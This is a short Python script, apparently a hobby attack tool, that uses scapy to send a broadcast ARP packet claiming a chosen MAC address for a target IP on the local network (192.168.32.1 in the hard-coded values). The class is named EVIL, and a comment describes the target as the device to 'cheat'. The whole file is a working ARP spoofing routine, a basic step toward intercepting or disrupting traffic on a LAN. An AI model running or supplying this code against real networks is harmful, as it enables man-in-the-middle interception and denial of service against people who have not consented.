from ipaddress import ip_address
from requests import request
from scapy.all import *


class EVIL:
    def change(self,src_mac,dst_ip):
     ether = Ether()
     ether.src = src_mac 
     ether.dst = 'ff:ff:ff:ff:ff:ff'
     arp = ARP()
     arp.hwsrc= src_mac
     arp.pdst = dst_ip 
     packet = ether/arp
     sendp(packet) # sends packet on layer 2


#MAC = input('Enter a source MAC address ex. 00:00:00:00:00:00 : ') <- Which MAC address do you want ?
#IP = input('Enter a destination IP address ex. 192.168.32.2 : ') <- Which device do you want cheat ?

MAC = 'aa:bb:cc:33:22:11'
IP = '192.168.32.1'


first_attempt = EVIL()
first_attempt.change(MAC,IP)
